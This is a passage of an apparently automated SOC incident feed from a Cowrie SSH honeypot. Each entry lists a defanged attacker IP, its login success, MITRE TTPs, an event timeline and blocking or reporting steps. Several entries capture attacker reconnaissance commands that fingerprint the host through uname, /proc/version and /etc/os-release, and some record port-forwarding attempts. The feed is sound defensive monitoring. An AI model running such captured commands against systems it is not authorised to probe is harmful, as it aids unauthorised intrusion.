- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-033b8f6315bd

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:04 |
| **Last Seen** | 2026-07-24 06:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:04:02` | `cowrie.session.connect` |
| `2026-07-24 06:04:02` | `cowrie.client.version` |
| `2026-07-24 06:04:02` | `cowrie.client.kex` |
| `2026-07-24 06:04:03` | `cowrie.login.success` |
| `2026-07-24 06:04:03` | `cowrie.session.params` |
| `2026-07-24 06:04:03` | `cowrie.command.input` |
| `2026-07-24 06:04:04` | `cowrie.log.closed` |
| `2026-07-24 06:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c806de533ebb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:04 |
| **Last Seen** | 2026-07-24 06:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:04:53` | `cowrie.session.connect` |
| `2026-07-24 06:04:53` | `cowrie.client.version` |
| `2026-07-24 06:04:53` | `cowrie.client.kex` |
| `2026-07-24 06:04:57` | `cowrie.login.success` |
| `2026-07-24 06:04:59` | `cowrie.session.params` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:04:59` | `cowrie.command.success` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:04:59` | `cowrie.command.input` |
| `2026-07-24 06:05:00` | `cowrie.log.closed` |
| `2026-07-24 06:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef766f66678

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:05 |
| **Last Seen** | 2026-07-24 06:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:05:45` | `cowrie.session.connect` |
| `2026-07-24 06:05:45` | `cowrie.client.version` |
| `2026-07-24 06:05:45` | `cowrie.client.kex` |
| `2026-07-24 06:05:45` | `cowrie.login.success` |
| `2026-07-24 06:05:46` | `cowrie.session.params` |
| `2026-07-24 06:05:46` | `cowrie.command.input` |
| `2026-07-24 06:05:46` | `cowrie.log.closed` |
| `2026-07-24 06:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2621096a8db2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:07 |
| **Last Seen** | 2026-07-24 06:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:07:05` | `cowrie.session.connect` |
| `2026-07-24 06:07:05` | `cowrie.client.version` |
| `2026-07-24 06:07:05` | `cowrie.client.kex` |
| `2026-07-24 06:07:08` | `cowrie.login.success` |
| `2026-07-24 06:07:11` | `cowrie.session.params` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:11` | `cowrie.command.success` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:11` | `cowrie.command.input` |
| `2026-07-24 06:07:12` | `cowrie.log.closed` |
| `2026-07-24 06:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2faec15c05

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:07 |
| **Last Seen** | 2026-07-24 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:07:30` | `cowrie.session.connect` |
| `2026-07-24 06:07:30` | `cowrie.client.version` |
| `2026-07-24 06:07:30` | `cowrie.client.kex` |
| `2026-07-24 06:07:30` | `cowrie.login.success` |
| `2026-07-24 06:07:31` | `cowrie.session.params` |
| `2026-07-24 06:07:31` | `cowrie.command.input` |
| `2026-07-24 06:07:31` | `cowrie.log.closed` |
| `2026-07-24 06:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11c6dc3e8b7f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:09 |
| **Last Seen** | 2026-07-24 06:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:09:11` | `cowrie.session.connect` |
| `2026-07-24 06:09:12` | `cowrie.client.version` |
| `2026-07-24 06:09:12` | `cowrie.client.kex` |
| `2026-07-24 06:09:16` | `cowrie.login.success` |
| `2026-07-24 06:09:18` | `cowrie.session.params` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:18` | `cowrie.command.success` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:18` | `cowrie.command.input` |
| `2026-07-24 06:09:20` | `cowrie.log.closed` |
| `2026-07-24 06:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d74a57d1d6e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:09 |
| **Last Seen** | 2026-07-24 06:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:09:18` | `cowrie.session.connect` |
| `2026-07-24 06:09:18` | `cowrie.client.version` |
| `2026-07-24 06:09:19` | `cowrie.client.kex` |
| `2026-07-24 06:09:19` | `cowrie.login.success` |
| `2026-07-24 06:09:20` | `cowrie.session.params` |
| `2026-07-24 06:09:20` | `cowrie.command.input` |
| `2026-07-24 06:09:20` | `cowrie.log.closed` |
| `2026-07-24 06:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-904caafe7718

| Field | Detail |
|---|---|
| **Source IP** | `60.249.252[.]94` |
| **First Seen** | 2026-07-24 06:10 |
| **Last Seen** | 2026-07-24 06:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:10:21` | `cowrie.session.connect` |
| `2026-07-24 06:10:22` | `cowrie.client.version` |
| `2026-07-24 06:10:22` | `cowrie.client.kex` |
| `2026-07-24 06:10:24` | `cowrie.login.success` |
| `2026-07-24 06:10:25` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.252[.]94` to AbuseIPDB if not already reported
- [ ] Block `60.249.252[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0e16eea743

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-07-24 06:10 |
| **Last Seen** | 2026-07-24 06:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:10:31` | `cowrie.session.connect` |
| `2026-07-24 06:10:32` | `cowrie.client.version` |
| `2026-07-24 06:10:32` | `cowrie.client.kex` |
| `2026-07-24 06:10:34` | `cowrie.login.success` |
| `2026-07-24 06:10:34` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f688491c6284

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:11 |
| **Last Seen** | 2026-07-24 06:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:11:05` | `cowrie.session.connect` |
| `2026-07-24 06:11:05` | `cowrie.client.version` |
| `2026-07-24 06:11:05` | `cowrie.client.kex` |
| `2026-07-24 06:11:05` | `cowrie.login.success` |
| `2026-07-24 06:11:06` | `cowrie.session.params` |
| `2026-07-24 06:11:06` | `cowrie.command.input` |
| `2026-07-24 06:11:06` | `cowrie.log.closed` |
| `2026-07-24 06:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a2c519ddf1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:11 |
| **Last Seen** | 2026-07-24 06:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:11:16` | `cowrie.session.connect` |
| `2026-07-24 06:11:16` | `cowrie.client.version` |
| `2026-07-24 06:11:16` | `cowrie.client.kex` |
| `2026-07-24 06:11:20` | `cowrie.login.success` |
| `2026-07-24 06:11:23` | `cowrie.session.params` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:23` | `cowrie.command.success` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:23` | `cowrie.command.input` |
| `2026-07-24 06:11:24` | `cowrie.log.closed` |
| `2026-07-24 06:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72fde1896143

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:12 |
| **Last Seen** | 2026-07-24 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:12:51` | `cowrie.session.connect` |
| `2026-07-24 06:12:51` | `cowrie.client.version` |
| `2026-07-24 06:12:51` | `cowrie.client.kex` |
| `2026-07-24 06:12:51` | `cowrie.login.success` |
| `2026-07-24 06:12:52` | `cowrie.session.params` |
| `2026-07-24 06:12:52` | `cowrie.command.input` |
| `2026-07-24 06:12:52` | `cowrie.log.closed` |
| `2026-07-24 06:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4fcc19ca372

| Field | Detail |
|---|---|
| **Source IP** | `182.42.113[.]10` |
| **First Seen** | 2026-07-24 06:13 |
| **Last Seen** | 2026-07-24 06:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:13:05` | `cowrie.session.connect` |
| `2026-07-24 06:13:05` | `cowrie.client.version` |
| `2026-07-24 06:13:05` | `cowrie.client.kex` |
| `2026-07-24 06:13:08` | `cowrie.login.success` |
| `2026-07-24 06:13:09` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.42.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `182.42.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba924772edbb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:13 |
| **Last Seen** | 2026-07-24 06:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:13:16` | `cowrie.session.connect` |
| `2026-07-24 06:13:16` | `cowrie.client.version` |
| `2026-07-24 06:13:16` | `cowrie.client.kex` |
| `2026-07-24 06:13:20` | `cowrie.login.success` |
| `2026-07-24 06:13:23` | `cowrie.session.params` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:23` | `cowrie.command.success` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:23` | `cowrie.command.input` |
| `2026-07-24 06:13:24` | `cowrie.log.closed` |
| `2026-07-24 06:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-242a8bca7aa3

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-24 06:13 |
| **Last Seen** | 2026-07-24 06:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:13:34` | `cowrie.session.connect` |
| `2026-07-24 06:13:34` | `cowrie.client.version` |
| `2026-07-24 06:13:34` | `cowrie.client.kex` |
| `2026-07-24 06:13:38` | `cowrie.login.success` |
| `2026-07-24 06:13:39` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1fb584c44e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.205[.]197` |
| **First Seen** | 2026-07-24 06:13 |
| **Last Seen** | 2026-07-24 06:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:13:44` | `cowrie.session.connect` |
| `2026-07-24 06:13:44` | `cowrie.client.version` |
| `2026-07-24 06:13:44` | `cowrie.client.kex` |
| `2026-07-24 06:13:45` | `cowrie.login.success` |
| `2026-07-24 06:13:46` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.205[.]197` to AbuseIPDB if not already reported
- [ ] Block `65.20.205[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e551e16eff27

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:14 |
| **Last Seen** | 2026-07-24 06:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:14:43` | `cowrie.session.connect` |
| `2026-07-24 06:14:43` | `cowrie.client.version` |
| `2026-07-24 06:14:43` | `cowrie.client.kex` |
| `2026-07-24 06:14:43` | `cowrie.login.success` |
| `2026-07-24 06:14:44` | `cowrie.session.params` |
| `2026-07-24 06:14:44` | `cowrie.command.input` |
| `2026-07-24 06:14:44` | `cowrie.log.closed` |
| `2026-07-24 06:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d9ce58f649

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:15 |
| **Last Seen** | 2026-07-24 06:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:15:22` | `cowrie.session.connect` |
| `2026-07-24 06:15:23` | `cowrie.client.version` |
| `2026-07-24 06:15:23` | `cowrie.client.kex` |
| `2026-07-24 06:15:27` | `cowrie.login.success` |
| `2026-07-24 06:15:29` | `cowrie.session.params` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:29` | `cowrie.command.success` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:29` | `cowrie.command.input` |
| `2026-07-24 06:15:30` | `cowrie.log.closed` |
| `2026-07-24 06:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be839367ab50

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:16 |
| **Last Seen** | 2026-07-24 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:16:35` | `cowrie.session.connect` |
| `2026-07-24 06:16:35` | `cowrie.client.version` |
| `2026-07-24 06:16:35` | `cowrie.client.kex` |
| `2026-07-24 06:16:35` | `cowrie.login.success` |
| `2026-07-24 06:16:36` | `cowrie.session.params` |
| `2026-07-24 06:16:36` | `cowrie.command.input` |
